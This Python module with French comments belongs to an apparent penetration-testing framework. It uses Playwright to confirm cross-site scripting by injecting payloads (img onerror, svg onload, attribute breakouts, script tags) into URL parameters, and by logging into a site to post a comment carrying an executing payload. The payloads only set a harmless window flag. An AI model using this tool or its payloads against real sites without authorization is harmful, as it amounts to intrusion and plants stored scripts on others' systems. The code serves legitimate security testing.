"""
Confirmateur XSS par navigateur (Playwright) pour PENTAGON.

Là où xss_tester détecte la *condition* d'un XSS (réflexion/stockage non
échappé), cet outil CONFIRME l'*exécution* réelle du script : il pilote un vrai
navigateur, injecte un marqueur exécutant, et vérifie qu'il s'est déclenché.

C'est la seule façon de prouver un XSS de manière fiable (le XSS est une
exécution côté client ; le serveur ne « lance » jamais le script).

GÉNÉRIQUE : fonctionne sur toute URL. Le marqueur et la détection sont
universels, sans donnée spécifique à une cible.

Catégorie d'action RoE : exploitation (outil offensif).
Standards : OWASP A03:2021, OWASP WSTG-CLNT-01 (Testing for DOM-based XSS),
            CWE-79, MITRE ATT&CK T1059.007 (JavaScript).

GARDE-FOUS ÉTHIQUES :
- Marqueur de PREUVE non nuisible : il pose un drapeau `window.<marqueur>=1`,
  sans exfiltration, vol de session, ni défacement.
- Confirmation RÉFLÉCHIE : on ne fait naviguer QUE notre propre navigateur vers
  l'URL forgée → aucun autre utilisateur n'est affecté.
- Navigateur isolé et headless par défaut.

Dépendance : playwright (`pip install playwright && playwright install chromium`).
"""

from datetime import datetime, timezone
from typing import Any


# Marqueur d'exécution unique. S'il est positionné dans `window`, c'est que le
# script injecté s'est RÉELLEMENT exécuté dans le DOM.
EXEC_MARKER = "PGN_XSS_7s9"

# Charges qui POSITIONNENT le drapeau si elles s'exécutent. On privilégie
# img/svg (s'exécutent même injectées dans le corps HTML après chargement),
# et on couvre les ruptures de contexte d'attribut.
def _payloads() -> list[str]:
    flag = f"window.{EXEC_MARKER}=1"
    return [
        f'<img src=x onerror="{flag}">',
        f'<svg onload="{flag}">',
        f'"><img src=x onerror="{flag}">',
        f"'><img src=x onerror=\"{flag}\">",
        f'<script>{flag}</script>',
    ]

# Paramètres GET courants où injecter pour le XSS réfléchi.
COMMON_REFLECT_PARAMS = ["q", "search", "query", "keyword", "s", "name"]


def confirm_reflected_xss(
    urls: list[str],
    params: list[str] | None = None,
    headless: bool = True,
    nav_timeout_ms: int = 15000,
) -> dict[str, Any]:
    """
    Confirme l'exécution d'un XSS réfléchi en pilotant un navigateur.

    Pour chaque URL et paramètre, on navigue vers l'URL forgée avec une charge
    exécutante et on vérifie si le marqueur a été déclenché dans le DOM.

    Args:
        urls: URLs de base à tester.
        params: noms de paramètres à injecter (défaut : liste courante).
        headless: navigateur sans interface (True en CI/serveur).
        nav_timeout_ms: délai de navigation par page.

    Returns:
        Dict structuré avec les findings (XSS confirmés par exécution réelle).
    """
    started_at = datetime.now(timezone.utc)
    params = params or COMMON_REFLECT_PARAMS

    result: dict[str, Any] = {
        "tool": "xss_browser",
        "status": "success",
        "urls_tested": 0,
        "confirmed_findings": [],
        "duration_seconds": None,
        "error": None,
    }

    # Import paresseux : si Playwright n'est pas installé, on le signale proprement
    try:
        from playwright.sync_api import sync_playwright
    except ImportError:
        result["status"] = "error"
        result["error"] = (
            "Playwright non installé. Installez-le : "
            "pip install playwright && playwright install chromium"
        )
        return result

    try:
        with sync_playwright() as p:
            browser = p.chromium.launch(headless=headless)
            context = browser.new_context()
            page = context.new_page()

            # Toute boîte de dialogue (alert/confirm) déclenchée par un script
            # injecté est une preuve d'exécution : on la capte et on la ferme.
            dialog_fired = {"value": False}
            page.on("dialog", lambda d: (dialog_fired.__setitem__("value", True), d.dismiss()))

            for url in urls:
                result["urls_tested"] += 1
                found = _probe_url(page, url, params, dialog_fired, nav_timeout_ms)
                if found:
                    result["confirmed_findings"].append(found)

            context.close()
            browser.close()

    except Exception as e:
        result["status"] = "error"
        result["error"] = f"{type(e).__name__}: {str(e)}"

    ended_at = datetime.now(timezone.utc)
    result["duration_seconds"] = (ended_at - started_at).total_seconds()
    return result


def confirm_stored_xss_ui(
    base_url: str,
    login_link: str,
    username_selector: str,
    username_value: str,
    password_selector: str,
    password_value: str,
    login_button: str,
    content_link: str,
    content_field: str,
    submit_button: str,
    headless: bool = True,
    step_wait_ms: int = 2500,
    nav_timeout_ms: int = 40000,
) -> dict[str, Any]:
    """
    Confirme un XSS STOCKÉ en pilotant le vrai parcours UI :
    accueil → login → page de contenu → poste un commentaire avec un marqueur
    exécutant → vérifie si le script s'exécute (au rendu et après rechargement).

    GÉNÉRIQUE : tous les sélecteurs/URL sont des paramètres (la config propre à
    la cible vit côté appelant, dans tests/). Marqueur INERTE (drapeau window).

    Args:
        base_url: URL du frontend (SPA).
        login_link: sélecteur du lien vers le login (ex. "a[href='/login']").
        username_selector/value, password_selector/value: champs + identifiants.
        login_button: sélecteur du bouton de connexion.
        content_link: sélecteur du lien vers la page de contenu (ex. produit).
        content_field: sélecteur du champ de saisie (ex. "textarea").
        submit_button: sélecteur du bouton d'envoi (ex. bouton "Publier").

    Returns:
        Dict avec status, confirmed (bool), finding, notes, error.
    """
    started_at = datetime.now(timezone.utc)
    result: dict[str, Any] = {
        "tool": "xss_browser",
        "status": "success",
        "confirmed": False,
        "finding": None,
        "notes": [],
        "duration_seconds": None,
        "error": None,
    }

    try:
        from playwright.sync_api import sync_playwright
    except ImportError:
        result["status"] = "error"
        result["error"] = "Playwright non installé."
        return result

    canary = f'<img src=x onerror="window.{EXEC_MARKER}=1">'

    try:
        with sync_playwright() as p:
            browser = p.chromium.launch(headless=headless)
            page = browser.new_context().new_page()

            dialog_fired = {"value": False}
            page.on("dialog", lambda d: (dialog_fired.__setitem__("value", True), d.dismiss()))

            def executed() -> bool:
                try:
                    flag = bool(page.evaluate(f"() => window.{EXEC_MARKER} === 1"))
                except Exception:
                    flag = False
                return flag or dialog_fired["value"]

            # 1. Accueil
            page.goto(base_url, wait_until="networkidle", timeout=nav_timeout_ms)
            page.wait_for_timeout(step_wait_ms)

            # 2. Aller au login (clic) + se connecter
            page.click(login_link, timeout=nav_timeout_ms)
            page.wait_for_timeout(step_wait_ms)
            page.fill(username_selector, username_value, timeout=nav_timeout_ms)
            page.fill(password_selector, password_value, timeout=nav_timeout_ms)
            page.click(login_button, timeout=nav_timeout_ms)
            page.wait_for_timeout(step_wait_ms)
            result["notes"].append(f"Connecté (URL: {page.url}).")

            # 3. Aller sur la page de contenu (retour accueil puis clic)
            page.goto(base_url, wait_until="networkidle", timeout=nav_timeout_ms)
            page.wait_for_timeout(step_wait_ms)
            page.click(content_link, timeout=nav_timeout_ms)
            page.wait_for_timeout(step_wait_ms)

            # 4. Poster un commentaire avec le marqueur exécutant
            page.fill(content_field, f"PENTAGON test {canary}", timeout=nav_timeout_ms)
            page.click(submit_button, timeout=nav_timeout_ms)
            page.wait_for_timeout(step_wait_ms)

            # 5. Vérifie l'exécution au rendu immédiat
            fired_on_render = executed()

            # 6. Vérifie la persistance : on recharge la page de contenu
            dialog_fired["value"] = False
            page.goto(base_url, wait_until="networkidle", timeout=nav_timeout_ms)
            page.wait_for_timeout(step_wait_ms)
            page.click(content_link, timeout=nav_timeout_ms)
            page.wait_for_timeout(step_wait_ms)
            fired_after_reload = executed()

            if fired_on_render or fired_after_reload:
                result["confirmed"] = True
                result["finding"] = {
                    "title": "XSS stocké CONFIRMÉ par exécution dans le navigateur",
                    "severity": "high",
                    "owasp": "A03:2021 Injection",
                    "cwe": "CWE-79",
                    "mitre": "T1059.007",
                    "vector": "stored (confirmé navigateur)",
                    "target": base_url,
                    "evidence": "Un commentaire contenant une charge a été stocké puis "
                                "rendu, et le script s'est RÉELLEMENT exécuté dans le DOM "
                                f"(persistance après rechargement: {fired_after_reload}).",
                }
                result["notes"].append(
                    f"Exécution au rendu: {fired_on_render} ; après rechargement: {fired_after_reload}."
                )
            else:
                result["notes"].append(
                    "Commentaire posté mais aucune exécution détectée "
                    "(contenu probablement échappé par le frontend = sûr)."
                )

            browser.close()

    except Exception as e:
        result["status"] = "error"
        result["error"] = f"{type(e).__name__}: {str(e)}"

    ended_at = datetime.now(timezone.utc)
    result["duration_seconds"] = (ended_at - started_at).total_seconds()
    return result


def self_test(headless: bool = True) -> dict[str, Any]:
    """
    Vérifie que la chaîne Playwright + détection d'exécution fonctionne, sans
    cible vulnérable : on charge une page locale contenant une charge exécutante
    et on confirme que le marqueur se déclenche.

    Returns:
        {"ok": bool, "error": str | None}
    """
    out: dict[str, Any] = {"ok": False, "error": None}
    try:
        from playwright.sync_api import sync_playwright
    except ImportError:
        out["error"] = ("Playwright non installé : "
                        "pip install playwright && playwright install chromium")
        return out

    try:
        with sync_playwright() as p:
            browser = p.chromium.launch(headless=headless)
            page = browser.new_context().new_page()
            html = f'<html><body><img src=x onerror="window.{EXEC_MARKER}=1"></body></html>'
            page.set_content(html, wait_until="load")
            page.wait_for_timeout(300)
            out["ok"] = bool(page.evaluate(f"() => window.{EXEC_MARKER} === 1"))
            browser.close()
        if not out["ok"]:
            out["error"] = "Le marqueur ne s'est pas déclenché (détection KO)."
    except Exception as e:
        out["error"] = f"{type(e).__name__}: {str(e)}"
    return out


def _probe_url(page, url, params, dialog_fired, nav_timeout_ms) -> dict[str, Any] | None:
    """Teste une URL avec chaque paramètre/charge ; retourne un finding si exécution."""
    sep = "&" if "?" in url else "?"
    for param in params:
        for payload in _payloads():
            # Réinitialise les témoins d'exécution
            dialog_fired["value"] = False
            try:
                page.goto("about:blank")
                target = f"{url}{sep}{param}={payload}"
                page.goto(target, timeout=nav_timeout_ms, wait_until="load")
                # Laisse le temps aux handlers (onerror/onload) de s'exécuter
                page.wait_for_timeout(400)
                executed = bool(page.evaluate(f"() => window.{EXEC_MARKER} === 1"))
            except Exception:
                continue

            if executed or dialog_fired["value"]:
                return {
                    "title": "XSS confirmé par exécution dans le navigateur",
                    "severity": "high",
                    "owasp": "A03:2021 Injection",
                    "cwe": "CWE-79",
                    "mitre": "T1059.007",
                    "vector": "reflected (confirmé navigateur)",
                    "target": url,
                    "parameter": param,
                    "evidence": "Une charge injectée s'est RÉELLEMENT exécutée dans le "
                                "DOM (drapeau window positionné ou dialogue déclenché), "
                                "ce qui prouve le XSS au-delà de la simple réflexion.",
                }
    return None
